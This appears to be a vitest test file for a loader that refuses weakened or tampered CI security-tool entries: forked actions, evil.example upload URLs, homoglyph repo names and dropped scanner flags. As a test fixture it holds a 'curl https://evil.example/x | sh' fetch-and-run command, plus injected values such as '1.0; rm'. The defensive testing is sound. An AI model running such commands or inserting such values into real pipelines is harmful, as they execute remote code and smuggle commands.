    for (const v of [['UNKNOWN'], ['HIGH'], ['LOW,MEDIUM'], ['CRITICAL', 'HIGH']]) {
      const sev = realEntry('trivy-config');
      sev.choices.severity = v;
      refused(sev, /includes CRITICAL/);
    }
    const ok = realEntry('trivy-config');
    ok.choices.severity = ['CRITICAL', 'HIGH,CRITICAL'];
    expect(loadAt([ok])).toHaveLength(1);
  });

  it('P21 (I3, probe 17): gitleaks, the fallback, has the betterleaks locks', () => {
    const NOPE = /allowlist, ruling P19|ruling P20|in effect|exactly the content reviewed|gets no env|output file/;
    refused(both(realEntry('gitleaks'), plus('-v')), NOPE);
    refused(both(realEntry('gitleaks'), plus('--verbose')), NOPE);
    refused(both(realEntry('gitleaks'), swap('gitleaks.sarif', '-')), NOPE);
    refused(both(realEntry('gitleaks'), swap('1', '0')), NOPE);
    refused(both(realEntry('gitleaks'), swap('--redact', '--redact=0')), NOPE);
    refused(both(realEntry('gitleaks'), without('--redact')), NOPE);
    refused(both(realEntry('gitleaks'), without('--ignore-gitleaks-allow')), NOPE);
    const noConfig = realEntry('gitleaks');
    delete noConfig.fixedInputs.config;
    refused(noConfig, NOPE);
    const env = realEntry('gitleaks');
    env.step.cli.env = { GITLEAKS_CONFIG: 'x.toml' };
    refused(env, NOPE);
    expect(loadAt([realEntry('gitleaks')])).toHaveLength(1);
  });

  it('P22 (I4, probes 21-23): pypi-publish publishes to PyPI or TestPyPI only, by its name under any owner; one spelling per input', () => {
    const pub = () => realEntry('pypi-publish');
    const setWith = (e: Entry, k: string, v: string) => { e.step.action.with[k] = v; e.fixedInputs.with[k] = v; return e; };
    refused(setWith(pub(), 'repository-url', 'https://evil.example/legacy/'), /repository-url/);
    const choice = pub();
    choice.choices = { 'repository-url': ['https://upload.pypi.org/legacy/'] };
    refused(choice, /repository-url/);
    const stepOnly = pub();
    stepOnly.step.action.with['repository-url'] = 'https://test.pypi.org/legacy/';
    refused(stepOnly, /repository-url/); // set, but not fixed
    expect(loadAt([setWith(pub(), 'repository-url', 'https://test.pypi.org/legacy/')])).toHaveLength(1);
    expect(loadAt([setWith(pub(), 'packages-dir', 'dist')])).toHaveLength(1);
    refused(setWith(pub(), 'verify-metadata', 'false'), /may set only/);
    // a fork under another owner, with a password (probe 22)
    const PW = ['pass', 'word'].join('');
    const fork = pub();
    fork.candidate.repo = 'evilorg/gh-action-pypi-publish';
    fork.candidate.name = 'evilorg/gh-action-pypi-publish';
    fork.step.action.uses = fork.step.action.uses.replace('pypa/', 'evilorg/');
    refused(setWith(fork, PW, 'x'), /password/);
    // two spellings of one input (probe 23), for every action
    refused(setWith(pub(), 'Attestations', 'false'), /twice in different letter case/);
    const sc = realEntry('scorecard-action');
    refused(setWith(sc, 'PUBLISH_RESULTS', 'true'), /twice in different letter case/);
    const dr = realEntry('dependency-review-action');
    refused(setWith(dr, 'COMMENT-SUMMARY-IN-PR', 'always'), /twice in different letter case/);
    // dependency review: warn-only only ever fixed "false"; no config file (P20)
    refused(setWith(realEntry('dependency-review-action'), 'warn-only', 'true'), /warn-only/);
    const warnChoice = realEntry('dependency-review-action');
    warnChoice.choices = { 'warn-only': ['true', 'false'] };
    refused(warnChoice, /warn-only/);
    expect(loadAt([setWith(realEntry('dependency-review-action'), 'warn-only', 'false')])).toHaveLength(1);
    refused(setWith(realEntry('dependency-review-action'), 'config-file', 'someorg/somerepo/dr.yml@main'), /config-file/);
  });

  it('P23 (I5): configSections name a file and a section; the auto-loaded config sources are listed', () => {
    for (const bad of ['pyproject.toml', ':tool.mypy', '../x.toml:a', '/etc/x:y', 'pyproject.toml:', 'a b:c']) {
      const e = realEntry('mypy');
      e.configSections = [bad];
      refused(e, /config section|configSections/);
    }
    const t = (id: string) => byId(real(), id)[0];
    expect(t('mypy')?.configSections).toEqual(expect.arrayContaining(['pyproject.toml:tool.mypy', 'setup.cfg:mypy']));
    expect(t('coverage-py')?.configSections).toEqual(expect.arrayContaining(['pyproject.toml:tool.coverage', 'setup.cfg:coverage:*', 'tox.ini:coverage:*']));
    expect(t('c8')?.configSections).toEqual(['package.json:c8']);
    expect(t('prettier')?.configSections).toEqual(['package.json:prettier']);
    expect(t('ruff')?.configSections).toEqual(['pyproject.toml:tool.ruff']);
    expect(t('bandit')?.configSections).toEqual(['pyproject.toml:tool.bandit']);
    expect(t('oxlint-typeaware')?.configFiles).toEqual(expect.arrayContaining(['.eslintignore', '**/.oxlintrc.json']));
    expect(t('prettier')?.configFiles).toEqual(expect.arrayContaining(['**/.prettierrc', '**/.prettierrc.*', '.editorconfig']));
    expect(t('biome')?.configFiles).toEqual(expect.arrayContaining(['**/biome.json', '**/biome.jsonc']));
    expect(t('c8')?.configFiles).toEqual(expect.arrayContaining(['.c8rc.*', '.nycrc.*']));
  });

  it('P24 (I6, spec): coverage-py runs `coverage report --fail-under={fail-under}` after the tests; vitest a lines minimum; never 0', () => {
    const cov = byId(real(), 'coverage-py')[0];
    expect(cov?.step.cli?.then).toEqual([['coverage', 'report', '--fail-under={fail-under}']]);
    expect(cov?.choices['fail-under']).toEqual(['60', '70', '80', '90']);
    const noThen = realEntry('coverage-py');
    delete noThen.step.cli.then;
    refused(noThen, /follow-up command/);
    const zero = realEntry('coverage-py');
    zero.choices['fail-under'] = ['0', '60'];
    refused(zero, /fail-under/);
    const literal = realEntry('coverage-py');
    literal.step.cli.then = [['coverage', 'report', '--fail-under=0']];
    refused(literal, /fail-under/);
    const missing = realEntry('coverage-py');
    missing.step.cli.then = [['coverage', 'report']];
    refused(missing, /--fail-under/);
    const other = realEntry('coverage-py');
    other.step.cli.then = [['sh', '-c', 'true']];
    refused(other, /runs coverage itself/);
    const unknownChoice = realEntry('coverage-py');
    unknownChoice.step.cli.then = [['coverage', 'report', '--fail-under={nope}']];
    refused(unknownChoice, /fail-under|choice/);
    const vit = byId(real(), 'vitest-coverage')[0];
    expect(vit?.step.cli?.command).toContain('--coverage.thresholds.lines={coverage-thresholds-lines}');
    const vzero = realEntry('vitest-coverage');
    vzero.choices['coverage-thresholds-lines'] = ['0'];
    refused(vzero, /coverage\.thresholds\.lines/);
    refused(both(realEntry('vitest-coverage'), without('--coverage.thresholds.lines={coverage-thresholds-lines}')), /in effect/);
    // a choice no placeholder uses is refused (the AI sets only what the template names)
    const unused = realEntry('c8');
    unused.choices = { lines: ['60'] };
    refused(unused, /only a \{lines\} placeholder/);
  });

  it('P25 (I7): kube-linter fails on no objects and invalid resources; the ESLint configs lint the framework files', () => {
    for (const f of ['--fail-if-no-objects-found', '--fail-on-invalid-resource']) refused(both(realEntry('kube-linter'), without(f)), /in effect/);
    for (const id of ['eslint', 'eslint-typescript']) {
      const content = byId(real(), id)[0]?.fixedInputs.config?.content ?? '';
      for (const ext of ['jsx', 'vue', 'svelte', 'astro']) expect(content, `${id} ${ext}`).toContain(ext);
    }
    expect(byId(real(), 'eslint-typescript')[0]?.fixedInputs.config?.content).toContain('tsx');
  });

  it('P26 (I8): an action that runs an image records it with its digest; no digest, a malformed one or a cli entry is refused', () => {
    const sc = byId(real(), 'scorecard-action')[0];
    expect(sc?.wrappedImage).toEqual({ ref: 'ghcr.io/ossf/scorecard-action:v2.5.0', digest: 'sha256:1e1481c65fc2407d3fd6ab18a23c741eb4d1c0d9359ebafc4b3ab13aa61d8627' });
    const noDigest = realEntry('scorecard-action');
    delete noDigest.wrappedImage.digest;
    refused(noDigest, /digest/);
    const badDigest = realEntry('scorecard-action');
    badDigest.wrappedImage.digest = 'v2.5.0';
    refused(badDigest, /digest/);
    const onCli = realEntry('gosec');
    onCli.wrappedImage = { ref: 'x/y:1', digest: DIGEST };
    refused(onCli, /wrappedImage is for actions/);
    const never = realEntry('scorecard-action');
    never.wrappedImage.ref = 'aquasec/trivy:0.69.5';
    refused(never, /never adds/);
  });

  it('P27 and minors: gosec tracks suppressions; betterleaks exit code in both (M1) and format bound to the output (M2); release dates (M5)', () => {
    refused(both(realEntry('gosec'), without('-track-suppressions')), /track-suppressions/);
    expect(byId(real(), 'gosec')[0]?.step.cli?.command).toContain('-track-suppressions');
    refused(both(realEntry('betterleaks'), (xs) => xs.filter((x, i) => x !== '--exit-code' && xs[i - 1] !== '--exit-code')), /--exit-code/);
    refused(both(realEntry('betterleaks'), swap('sarif', 'csv')), /report-format csv/);
    const raw = (id: string) => rawFile().tools.find((t) => t.id === id) as Entry;
    expect(raw('nuclei').releasedAt).toBe('2026-08-08T12:51:42Z');
    expect(raw('jscpd').releasedAt).toBe('2026-10-20T16:15:27Z');
  });
});

// ---------- Task 6 re-review 1, fix round 2 (rulings P28, P29): written first, red against 8cda85a ----------

describe('Task 6 review fix round 2 (P28, P29)', () => {
  const realEntry = (id: string): Entry => structuredClone(rawFile().tools.find((t) => t.id === id) as Entry);
  const loadAt = (tools: Entry[]) => {
    const dir = makeTempDir();
    writeIn(dir, 'reviewed-tools.yml', stringify({ pinnedOn: rawFile().pinnedOn, tools }));
    return loadReviewed(`${dir}/reviewed-tools.yml`);
  };
  const refused = (e: Entry, why: RegExp) => expect(() => loadAt([e])).toThrow(why);
  const SHELL = ['sh', '-c', 'curl https://evil.example/x | sh'];
  /** A cli entry re-declared as an image of the same tool (R-C1): kind docker, pinned by digest, the upstream image. */
  const asDocker = (id: string, image: string) => {
    const e = realEntry(id);
    e.candidate.kind = 'docker';
    e.candidate.version = e.candidate.version.replace(/^v/, '');
    e.candidate.pin = { digest: DIGEST };
    e.step.cli.install = { method: 'docker', package: image, version: e.candidate.version };
    return e;
  };

  it('P28 (R-C1): the argv policy covers docker entries too: registry runs its entrypoint only, zap and semgrep their allowlists', () => {
    for (const id of ['registry', 'zap-baseline', 'semgrep']) expect(loadAt([realEntry(id)]), id).toHaveLength(1);
    const reg = realEntry('registry');
    reg.step.cli.command = [...SHELL];
    refused(reg, /registry|entrypoint|command/);
    const zap = realEntry('zap-baseline');
    zap.step.cli.command = [...SHELL, '-J', 'zap.json', '-z', '-silent'];
    refused(zap, /zap-baseline\.py|runs/);
    const warn = realEntry('zap-baseline');
    warn.step.cli.command.push('-I'); // warnings never fail the run
    refused(warn, /allowlist|unknown flag -I/);
    const autofix = realEntry('semgrep');
    autofix.step.cli.command.splice(2, 0, '--autofix');
    refused(autofix, /allowlist|unknown flag --autofix/);
    const metrics = realEntry('semgrep');
    metrics.step.cli.command = metrics.step.cli.command.map((x: string) => (x === '--metrics=off' ? '--metrics=on' : x));
    metrics.fixedInputs.args = metrics.fixedInputs.args.map((x: string) => (x === '--metrics=off' ? '--metrics=on' : x));
    refused(metrics, /metrics/);
  });

  it('P28 (R-C1): a cli tool re-declared as kind docker keeps its allowlist; a docker entry without a policy is refused', () => {
    const gosec = asDocker('gosec', 'securego/gosec');
    gosec.step.cli.command.splice(1, 0, '-no-fail');
    gosec.fixedInputs.args.unshift('-no-fail');
    refused(gosec, /allowlist|kind|ruling P2[08]/);
    const hado = asDocker('hadolint', 'hadolint/hadolint');
    hado.step.cli.command.splice(1, 0, '--no-fail');
    hado.fixedInputs.args.unshift('--no-fail');
    delete hado.fixedInputs.config;
    refused(hado, /allowlist|kind|ruling P2[08]|pinned config/);
    // the same entry, unchanged but for its kind, is refused too: the policy names its kind and package
    refused(asDocker('hadolint', 'hadolint/hadolint'), /kind|package/);
    const unknown = realEntry('registry');
    unknown.id = 'scanner2';
    unknown.candidate.id = 'scanner2';
    unknown.candidate.repo = 'example/scanner2';
    unknown.candidate.name = 'example/scanner2';
    unknown.step.cli.install.package = 'example/scanner2';
    refused(unknown, /no argv allowlist/);
    // a cli entry that installs another package under a reviewed id (M-R3)
    const other = realEntry('creosote');
    other.step.cli.install.package = 'creosote-evil';
    refused(other, /package/);
  });

  it('P29 (R-I1): dependency review, upload-artifact and the other actions take only their reviewed inputs', () => {
    const setWith = (e: Entry, k: string, v: string) => { e.step.action.with[k] = v; e.fixedInputs.with = { ...(e.fixedInputs.with ?? {}), [k]: v }; return e; };
    const dr = () => realEntry('dependency-review-action');
    refused(setWith(dr(), 'vulnerability-check', 'false'), /vulnerability-check/);
    refused(setWith(dr(), 'base-ref', 'main'), /base-ref/);
    refused(setWith(setWith(dr(), 'base-ref', 'x'), 'head-ref', 'x'), /base-ref|head-ref/);
    refused(setWith(dr(), 'fail-on-scopes', 'development'), /fail-on-scopes/);
    refused(setWith(dr(), 'fail-on-severity', 'critical'), /fail-on-severity/);
    expect(loadAt([setWith(dr(), 'fail-on-severity', 'low')])).toHaveLength(1);
    expect(loadAt([setWith(dr(), 'vulnerability-check', 'true')])).toHaveLength(1);
    const sev = dr();
    sev.choices = { 'fail-on-severity': ['low', 'critical'] };
    refused(sev, /fail-on-severity/);
    const up = () => realEntry('actions-upload-artifact');
    refused(setWith(up(), 'include-hidden-files', 'true'), /include-hidden-files/);
    refused(setWith(up(), 'path', '.env'), /path/);
    const checkout = realEntry('actions-checkout');
    checkout.choices['ref'] = ['main'];
    refused(checkout, /ref/);
    const node = realEntry('actions-setup-node');
    node.choices['node-version'] = ['24', '18'];
    refused(node, /node-version/);
    const sc = realEntry('scorecard-action');
    refused(setWith(sc, 'repo_token', 'x'), /repo_token/);
  });

  it('P29 (R-I1): an action whose exact repo has no input policy is refused (renamed and typo forks)', () => {
    const PW = ['pass', 'word'].join('');
    const fork = (id: string, repo: string, extra: [string, string]) => {
      const e = realEntry(id);
      e.candidate.repo = repo;
      e.candidate.name = repo;
      e.step.action.uses = `${repo}@${e.candidate.pin.sha}`;
      e.step.action.with[extra[0]] = extra[1];
      e.fixedInputs.with[extra[0]] = extra[1];
      return e;
    };
    refused(fork('pypi-publish', 'evilorg/pypi-upload', [PW, 'x']), /no input policy/);
    refused(fork('pypi-publish', 'pypa/gh-action-pypi-publlsh', [PW, 'x']), /no input policy|password/);
    refused(fork('scorecard-action', 'evilorg/scorecards', ['publish_results', 'true']), /no input policy|publish_results/);
    refused(fork('actions-checkout', 'actlons/checkout', ['persist-credentials', 'false']), /no input policy/);
    // every real action entry has one and loads
    const actions = rawFile().tools.filter((t) => t.candidate.kind === 'action');
    expect(actions.length).toBeGreaterThan(12);
    expect(loadAt(actions)).toHaveLength(actions.length);
  });

  it('minors (M-R1, M-R2): a placeholder is named after the flag it fills; an output path never starts with -', () => {
    const vit = realEntry('vitest-coverage');
    vit.choices = { 'exit-zero': ['60'] };
    vit.step.cli.command = vit.step.cli.command.map((x: string) => x.replace(/\{[^}]+\}/, '{exit-zero}'));
    vit.fixedInputs.args = vit.fixedInputs.args.map((x: string) => x.replace(/\{[^}]+\}/, '{exit-zero}'));
    refused(vit, /placeholder|exit-zero/);
    const ruff = realEntry('ruff');
    ruff.step.output.path = '--exit-zero';
    ruff.step.cli.command = ruff.step.cli.command.map((x: string) => (x === 'ruff.sarif' ? '--exit-zero' : x));
    ruff.fixedInputs.args = ruff.fixedInputs.args.map((x: string) => (x === 'ruff.sarif' ? '--exit-zero' : x));
    refused(ruff, /output/);
  });
});

// ---------- lookups ----------

describe('reviewedFor', () => {
  const tools = () => load([
    cliEntry(),
    { ...cliEntry({ id: 'gitleaks-proven' }), proofs: 2 },
    semgrepEntry(),
    actionEntry(),
  ]);

  it('reviewedFor: full mode skips entries with proofs 0; audit mode keeps them', () => {
    const list = tools();
    expect(reviewedFor(need('secrets'), 'node', list, 'audit').map((t) => t.id)).toEqual(['gitleaks', 'gitleaks-proven']);
    expect(reviewedFor(need('secrets'), 'node', list, 'full').map((t) => t.id)).toEqual(['gitleaks-proven']);
  });

  it('reviewedFor: matches the need category (from NEED_ID_CATEGORY) and the language or any', () => {
    const list = tools();
    expect(reviewedFor(need('sast'), 'python', list, 'audit').map((t) => t.id)).toEqual(['semgrep']);
    expect(reviewedFor(need('sast'), 'go', list, 'audit')).toEqual([]); // semgrep entry lists node and python only
    expect(reviewedFor(need('secrets'), 'go', list, 'audit')).toHaveLength(2); // gitleaks: any
    // a need whose category doesn't match its id's table category gets nothing (S6)
    expect(reviewedFor(need('secrets', { category: 'sast' }), 'node', list, 'audit')).toEqual([]);
    // platform is not a need category
    expect(reviewedFor(need('platform' as string, { category: 'platform' }), 'node', list, 'audit')).toEqual([]);
  });
});

describe('effectiveProtectedPaths', () => {
  it('effectiveProtectedPaths: base list plus configFiles of the tools in use, deduped', () => {
    const list = load([cliEntry(), semgrepEntry(), actionEntry()]);
    const paths = effectiveProtectedPaths(list);
    expect(paths.slice(0, PROTECTED_PATHS_BASE.length)).toEqual(PROTECTED_PATHS_BASE);
    expect(paths).toEqual(expect.arrayContaining(['.gitleaks.toml', '.gitleaksignore', '.semgrepignore']));
    expect(new Set(paths).size).toBe(paths.length); // .gitleaksignore and .semgrepignore are in the base list too
    expect(paths.length).toBe(PROTECTED_PATHS_BASE.length + 1); // only .gitleaks.toml is new
    expect(effectiveProtectedPaths([])).toEqual(PROTECTED_PATHS_BASE);
  });
});

describe('projectScriptFor', () => {
  it("projectScriptFor: unit-tests → 'test' and lint → 'lint' only when the script exists; missing script → null", () => {
    expect(projectScriptFor(need('unit-tests'), svc())?.script).toBe('test');
    expect(projectScriptFor(need('full-tests'), svc())?.script).toBe('test');
    expect(projectScriptFor(need('lint'), svc())?.script).toBe('lint');
    expect(projectScriptFor(need('format-lint'), svc())?.script).toBe('lint');
    expect(projectScriptFor(need('unit-tests'), svc({ scripts: ['lint'] }))).toBeNull();
    expect(projectScriptFor(need('lint'), svc({ scripts: ['test'] }))).toBeNull();
    // ids whose category is lint or full-tests but that aren't the project's own scripts
    expect(projectScriptFor(need('type-check'), svc())).toBeNull();
    expect(projectScriptFor(need('migration-check'), svc())).toBeNull();
    expect(projectScriptFor(need('secrets'), svc())).toBeNull();
    // a need for another service, and a service at the repo root (no workingDir)
    expect(projectScriptFor(need('unit-tests', { service: 'api' }), svc())).toBeNull();
    expect(projectScriptFor(need('unit-tests'), svc({ path: '.' }))).toEqual({ kind: 'project-script', needId: 'unit-tests', service: 'web', script: 'test' });
  });
});

describe('nearDuplicate', () => {
  const list = () => load([cliEntry(), actionEntry()]);

  it("nearDuplicate: full owner/name within distance 2 flagged ('gitleaks/gitIeaks' lowercased to 'gitleaks/gitieaks', and 'gitlleaks/gitleaks')", () => {
    const l = list();
    expect(nearDuplicate('gitleaks/gitIeaks', l)?.id).toBe('gitleaks'); // same owner, capital I for l (ruling S31)
    expect(nearDuplicate('gitlleaks/gitleaks', l)?.id).toBe('gitleaks');
    expect(nearDuplicate('gitleak/gitleak', l)?.id).toBe('gitleaks');
    expect(nearDuplicate('actions/setup-nodes', l)?.id).toBe('actions-setup-node');
  });

  it('nearDuplicate: a name that is not a plain ASCII GitHub repo is refused as a near-duplicate (M4)', () => {
    const l = list();
    // KELVIN SIGN (U+212A) for k: NFKC folds it to K, so it would compare equal to the real repo after lowercasing
    expect(nearDuplicate('gitlea\u212As/gitleaks', l)?.id).toBe('gitleaks');
    expect(nearDuplicate('gitleaks/gitlea\u212As', l)?.id).toBe('gitleaks');
    expect(nearDuplicate('actions/setup-n\u043ede', l)?.id).toBe('actions-setup-node'); // Cyrillic o
    expect(nearDuplicate('', l)).not.toBeNull();
    expect(nearDuplicate('x/y', [])).toBeNull(); // nothing reviewed to imitate
  });

  it('nearDuplicate: exact reviewed repo, in any letter case → null', () => {
    const l = list();
    expect(nearDuplicate('gitleaks/gitleaks', l)).toBeNull();
    expect(nearDuplicate('GitLeaks/GITLEAKS', l)).toBeNull();
    expect(nearDuplicate('Actions/Setup-Node', l)).toBeNull();
  });

  it("nearDuplicate: distance 3 or more → null ('actions/setup-node' vs 'actions/setup-go')", () => {
    const l = loadReviewed(writeList([actionEntry({ id: 'actions-setup-go', repo: 'actions/setup-go' })]), {
      argvPolicies: FIXTURE_POLICIES, actionPolicies: { ...ACTION_POLICIES, 'actions/setup-go': ACTION_POLICIES['actions/setup-node'] as Record<string, InputSpec> },
    });
    expect(nearDuplicate('actions/setup-node', l)).toBeNull();
    expect(nearDuplicate('someone/else', list())).toBeNull();
  });
});

describe('packageExists', () => {
  it('packageExists: 404 → false', async () => {
    const { fetch, calls } = fakeFetch({});
    expect(await packageExists('npm', 'left-padd', '1.0.0', fetch)).toBe(false);
    expect(await packageExists('pypi', 'reqeusts', '2.0.0', fetch)).toBe(false);
    expect(calls.map((c) => c.url.href)).toEqual(['https://registry.npmjs.org/left-padd/1.0.0', 'https://pypi.org/pypi/reqeusts/2.0.0/json']);
  });

  it('packageExists: 200 → true; names checked before any request, no credential sent (S14, S15)', async () => {
    const { fetch, calls } = fakeFetch({
      'GET https://registry.npmjs.org/@types%2fnode/20.0.0': { body: { name: '@types/node', version: '20.0.0' } },
      'GET https://pypi.org/pypi/zope-interface/6.0/json': { body: { info: { version: '6.0' } } },
    });
    expect(await packageExists('npm', '@types/node', '20.0.0', fetch)).toBe(true);
    expect(await packageExists('pypi', 'Zope.Interface', '6.0', fetch)).toBe(true);
    for (const c of calls) expect(Object.keys(c.headers).map((h) => h.toLowerCase())).not.toContain('authorization');
    const before = calls.length;
    for (const [reg, name, version] of [['npm', '../evil', '1.0.0'], ['npm', 'ok', 'latest'], ['pypi', 'a/b', '1.0'], ['pypi', 'ok', '1.0; rm']] as const) {
      expect(await packageExists(reg, name, version, fetch), `${reg} ${name} ${version}`).toBe(false);
    }
    expect(calls.length).toBe(before);
  });

  it('packageExists: another answer or a network failure is an error, never a silent yes', async () => {
    const { fetch } = fakeFetch({ 'GET https://registry.npmjs.org/flaky/1.0.0': { status: 503 } });
    await expect(packageExists('npm', 'flaky', '1.0.0', fetch)).rejects.toThrow(/registry/i);
    const down = (async () => { throw new TypeError('fetch failed'); }) as unknown as typeof globalThis.fetch;
    await expect(packageExists('pypi', 'requests', '2.0.0', down)).rejects.toThrow(/PyPI/);
    const redirect = fakeFetch({ 'GET https://registry.npmjs.org/moved/1.0.0': { status: 302, headers: { location: 'https://evil.example/x' } } });
    await expect(packageExists('npm', 'moved', '1.0.0', redirect.fetch)).rejects.toThrow();
    expect(redirect.calls.map((c) => c.url.host)).toEqual(['registry.npmjs.org']);
  });

  it('reviewed-tools.yml: pinnedOn is not in the future (the cooldown is measured from it)', () => {
    expect(Date.parse(rawFile().pinnedOn), 'pinnedOn is not in the future').toBeLessThanOrEqual(Date.now());
  });
});
